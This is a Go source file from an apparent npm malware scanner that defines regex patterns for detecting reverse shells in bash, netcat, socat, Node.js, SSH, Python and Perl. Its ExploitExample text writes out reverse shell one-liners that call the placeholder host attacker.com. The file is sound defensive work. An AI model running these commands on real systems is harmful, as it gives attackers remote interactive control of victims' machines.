package analyzer

import (
	"fmt"
	"regexp"
)

// ReverseShellAnalyzer detects reverse shell establishment patterns in JavaScript.
// Based on ethers-provider2 (SSH reverse shell, March 2025), NodeCordRAT, and
// 48 malicious npm packages deploying reverse shells (November 2023).
type ReverseShellAnalyzer struct{}

func NewReverseShellAnalyzer() *ReverseShellAnalyzer {
	return &ReverseShellAnalyzer{}
}

func (a *ReverseShellAnalyzer) Name() string {
	return "reverse-shell"
}

var reverseShellPatterns = []struct {
	Pattern     *regexp.Regexp
	Title       string
	Description string
	Severity    Severity
}{
	// Bash reverse shells
	{
		regexp.MustCompile(`/dev/tcp/[^\s]+/\d+`),
		"Bash /dev/tcp reverse shell",
		"Code uses bash /dev/tcp for reverse shell connection",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`bash\s+-i\s+>&\s*/dev/`),
		"Interactive bash reverse shell",
		"Code spawns an interactive bash shell redirected to a network socket",
		SeverityCritical,
	},
	// Netcat reverse shells
	{
		regexp.MustCompile(`\b(nc|ncat|netcat)\s+(-[a-z]*e\s+|--exec\s+)`),
		"Netcat reverse shell",
		"Code uses netcat with exec flag to establish a reverse shell",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`\bsocat\b.*\bexec\b`),
		"Socat reverse shell",
		"Code uses socat with exec to establish a reverse shell",
		SeverityCritical,
	},
	// Node.js net module reverse shell
	{
		regexp.MustCompile(`net\.(createConnection|connect|Socket)\s*\([^)]*\)[\s\S]{0,200}child_process`),
		"Node.js net+child_process reverse shell",
		"Code combines Node.js net module with child_process, the classic pattern for a Node.js reverse shell",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`child_process[\s\S]{0,200}net\.(createConnection|connect|Socket)`),
		"Node.js child_process+net reverse shell",
		"Code combines child_process with net module for reverse shell establishment",
		SeverityCritical,
	},
	// SSH reverse tunnel
	{
		regexp.MustCompile(`ssh\s+(-[a-zA-Z]*R|-[a-zA-Z]*N\s+-R)\s`),
		"SSH reverse tunnel",
		"Code establishes an SSH reverse tunnel, used in the ethers-provider2 attack for persistent encrypted reverse access",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`ssh\s+-[a-zA-Z]*D\s+`),
		"SSH dynamic port forward",
		"Code creates an SSH dynamic port forward (SOCKS proxy) for network tunneling",
		SeverityHigh,
	},
	// Python reverse shell invoked from Node
	{
		regexp.MustCompile(`python[23]?\s+-c\s+['"]import\s+socket`),
		"Python reverse shell from Node",
		"Code invokes a Python reverse shell from within a Node.js process",
		SeverityCritical,
	},
	// Perl/Ruby reverse shells
	{
		regexp.MustCompile(`perl\s+-e\s+['"].*socket\s*\(`),
		"Perl reverse shell",
		"Code invokes a Perl reverse shell",
		SeverityCritical,
	},
	// Pipe to shell with network socket
	{
		regexp.MustCompile(`\.pipe\s*\(\s*\w+\.stdin\b`),
		"Socket-to-process pipe",
		"Code pipes a network socket to a process stdin, characteristic of reverse shell construction",
		SeverityHigh,
	},
	{
		regexp.MustCompile(`\bspawn\s*\(\s*['"](?:/bin/(?:ba)?sh|cmd(?:\.exe)?|powershell)['"]\s*\)`),
		"Shell process spawn",
		"Code spawns a shell process, which combined with network connections indicates reverse shell",
		SeverityHigh,
	},
}

func (a *ReverseShellAnalyzer) scanContent(content, filename string) []Finding {
	var findings []Finding

	for _, pat := range reverseShellPatterns {
		if pat.Pattern.MatchString(content) {
			findings = append(findings, Finding{
				Analyzer:    a.Name(),
				Title:       pat.Title,
				Description: fmt.Sprintf("%s in file %q.", pat.Description, filename),
				Severity:    pat.Severity,
				ExploitExample: "Reverse shell attacks provide interactive remote access:\n" +
					"    - Bash: bash -i >& /dev/tcp/attacker.com/4444 0>&1\n" +
					"    - Node: net.connect({port:4444,host:'c2'}).pipe(spawn('sh').stdin)\n" +
					"    - SSH tunnel: ssh -R 0:localhost:22 attacker.com (encrypted, persistent)\n" +
					"    - ethers-provider2 (March 2025) used SSH reverse tunnels for stealth",
				Remediation: "Remove the package immediately. Check for active network connections and processes spawned by the package.",
			})
		}
	}

	return findings
}
